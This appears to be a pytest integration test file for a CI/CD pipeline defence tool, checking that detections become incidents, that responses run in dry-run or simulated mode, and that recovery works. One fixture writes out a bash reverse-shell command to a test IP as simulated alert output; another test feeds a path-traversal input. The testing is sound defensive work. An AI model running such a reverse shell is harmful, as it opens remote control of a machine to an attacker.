"""Member 2 — API integration: detection alert -> incident -> response -> recovery, through FastAPI.

Uses an in-memory SQLite database and mocks only RabbitMQ/Redis, so Member 1's detectors, worker and
correlation engine produce the alerts the Member 2 endpoints act on.
"""

import shutil
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from detection.api import main
from detection.worker import process_event
from shared import config
from shared.database import get_session
from shared.schema import EventKind, PipelineEvent
from tests.m2_factories import known_good_run, memory_session_factory, scenario07

ROOT = Path(__file__).resolve().parents[1]
PPE_WORKFLOW = (ROOT / "attack-lab" / "07-correlated-incident" / "workflow.yml").read_text(encoding="utf-8")


@pytest.fixture
def factory():
    return memory_session_factory()


@pytest.fixture
def client(factory):
    def override():
        with factory() as session:
            yield session

    main.app.dependency_overrides[get_session] = override
    with patch.object(main.messaging, "publish"), patch.object(main.cache, "delete"), \
         patch.object(config, "SCAN_ROOT", str(ROOT)):
        yield TestClient(main.app)
    main.app.dependency_overrides.clear()


def detect(factory, event: PipelineEvent):
    """Run Member 1's worker pipeline on one event (Redis mocked)."""
    with patch("detection.worker.cache.was_processed", return_value=False), \
         patch("detection.worker.cache.mark_processed"), patch("detection.worker.cache.delete"):
        return process_event(event, session_factory=factory)


class TestDetectionToResponse:

    def test_detected_attack_triggers_response_and_recovery(self, client, factory):
        run_id = f"e2e-{uuid4().hex[:8]}"
        workflow = ".github/workflows/pr-build.yml"
        detect(factory, PipelineEvent(kind=EventKind.WORKFLOW, run_id=run_id, workflow=workflow, attack_id="07",
                                      payload={"path": workflow, "content": PPE_WORKFLOW}))
        detect(factory, PipelineEvent(kind=EventKind.RUNTIME, run_id=run_id, workflow=workflow, attack_id="07",
                                      payload={"rule": "PipelineSentry Reverse Shell in Runner", "priority": "Critical",
                                               "time": datetime.now(timezone.utc).isoformat(), "hostname": "runner-42",
                                               "output": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
                                               "simulated": True}))

        incidents = client.get("/incidents").json()
        [found] = [i for i in incidents if i["run_id"] == run_id]
        assert found["severity"] == "critical" and found["layers"] == ["runtime", "static"]
        assert found["child_count"] >= 2 and found["action_counts"] == {}

        dry = client.post(f"/alerts/{found['id']}/respond", json={"mode": "dry_run"}).json()
        assert dry["outcome"] == "planned"
        assert {"cancel_pipeline", "quarantine_runner"} <= {a["action"] for a in dry["actions"]}

        live = client.post(f"/alerts/{found['id']}/respond", json={"mode": "live"})
        assert live.status_code == 403 and live.json()["outcome"] == "rejected"

        executed = client.post(f"/alerts/{found['id']}/respond", json={"mode": "simulated"}).json()
        assert executed["outcome"] == "contained" and executed["alert_status"] == "handled"
        repeat = client.post(f"/alerts/{found['id']}/respond", json={"mode": "simulated"}).json()
        assert all(a["duplicate"] for a in repeat["actions"])

        detail = client.get(f"/incidents/{found['id']}").json()
        assert {(a["mode"], a["status"]) for a in detail["actions"]} == {
            ("dry_run", "planned"), ("live", "rejected"), ("simulated", "succeeded")}
        # SEC-003 (DEPLOY_TOKEN echoed to the log) adds a credential revocation for the named secret
        assert {c["kind"] for c in detail["containments"]} == {"pipeline", "runner", "credential"}
        assert {c["target"] for c in detail["containments"] if c["kind"] == "credential"} == {"DEPLOY_TOKEN"}
        assert detail["recovery_plan"]["ready"] is True
        assert all(c["status"] == "handled" for c in detail["children"])

        with factory() as s:
            known_good_run(s, workflow)
        recovered = client.post(f"/incidents/{found['id']}/recover", json={}).json()
        assert recovered["outcome"] == "recovered"
        runs = client.get("/recovery", params={"incident_id": found["id"]}).json()
        assert {r["plan"] for r in runs} == {"resume_pipeline", "restore_runner", "rotate_credential"}
        assert client.get(f"/incidents/{found['id']}/recovery-plan").json()["plans"] == []

        responses = client.get("/responses", params={"run_id": run_id, "mode": "simulated"}).json()
        assert {r["status"] for r in responses} == {"succeeded"} and all(r["simulated"] for r in responses)

    def test_api_errors(self, client, factory):
        assert client.post("/alerts/missing/respond", json={}).status_code == 404
        assert client.post("/alerts/x/respond", json={"mode": "yolo"}).status_code == 422
        assert client.get("/incidents/missing").status_code == 404
        assert client.post("/incidents/missing/recover", json={}).status_code == 404
        with factory() as s:
            rollup_id = scenario07(s).id
        assert client.post(f"/incidents/{rollup_id}/recover", json={"plans": ["nope"]}).status_code == 422
        blocked = client.post(f"/incidents/{rollup_id}/recover", json={}).json()
        assert blocked["outcome"] == "blocked"


class TestReadEndpoints:

    def test_events_list(self, client, factory):
        run_id = f"ev-{uuid4().hex[:6]}"
        detect(factory, PipelineEvent(kind=EventKind.IMAGE, run_id=run_id, workflow="release.yml",
                                      payload={"image": "ghcr.io/org/app:latest", "signatures": []}))
        events = client.get("/events", params={"run_id": run_id}).json()
        assert len(events) == 1 and events[0]["status"] == "done" and len(events[0]["alert_ids"]) == 2

    def test_defence_status_and_cors(self, client):
        response = client.get("/defence/status", headers={"Origin": "http://localhost:5173"})
        assert response.status_code == 200
        assert response.headers["access-control-allow-origin"] == "http://localhost:5173"
        body = response.json()
        assert body["response"]["default_mode"] == config.RESPONSE_MODE
        assert body["recovery"]["mode"] == "simulated"

    def test_sbom_endpoint_links_to_detection(self, client):
        result = client.post("/supply-chain/sbom", json={
            "path": "attack-lab/03-dependency-typosquat/requirements.txt", "run_id": "sbom-run"}).json()
        assert result["status"] == "generated" and len(result["event_ids"]) == 1
        stored = client.get(f"/supply-chain/results/{result['id']}").json()
        assert stored["document"]["bomFormat"] == "CycloneDX"
        assert client.get(f"/supply-chain/results/{result['id']}/sbom").json()["specVersion"] == "1.6"
        assert client.post("/supply-chain/sbom", json={"path": "../outside.txt"}).status_code == 400
        assert client.post("/supply-chain/sbom", json={}).status_code == 422

    @pytest.mark.skipif(shutil.which("opa") is None, reason="opa binary not installed")
    def test_policy_endpoint(self, client):
        samples = client.get("/policy/samples").json()
        pod = next(s for s in samples if s["name"] == "privileged-pod.yaml")
        result = client.post("/policy/evaluate", json={"kind": "kubernetes", "path": pod["path"]}).json()
        assert result["allowed"] is False and result["alert_ids"]
        alerts = client.get("/alerts", params={"run_id": result["run_id"]}).json()
        assert {a["id"] for a in alerts if a["layer"] == "static"} == set(result["alert_ids"])
        assert client.get("/policy/results", params={"allowed": False}).json()[0]["id"] == result["id"]
        bad = client.post("/policy/evaluate", json={"kind": "workflow", "content": "name: x\n"})
        assert bad.status_code == 422
